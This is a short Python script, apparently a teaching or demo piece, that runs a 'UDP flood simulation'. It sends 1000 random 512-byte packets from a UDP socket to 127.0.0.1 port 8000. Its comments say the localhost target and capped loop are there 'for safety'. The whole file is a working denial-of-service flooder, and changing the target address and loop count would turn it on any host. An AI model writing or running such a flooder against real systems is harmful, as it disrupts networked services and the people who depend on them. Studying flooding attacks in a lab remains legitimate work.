import socket
import random
import time

# Target details (localhost for safety)
target_ip = "127.0.0.1"
target_port = 8000

# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate random data packet
data = random._urandom(512)

print("Starting UDP Flood Simulation...")

# Send packets (limited for safety)
for i in range(1000):
    sock.sendto(data, (target_ip, target_port))
    print(f"Packet {i+1} sent")
    # time.sleep(0.01)
    
print("UDP Flood Simulation Finished")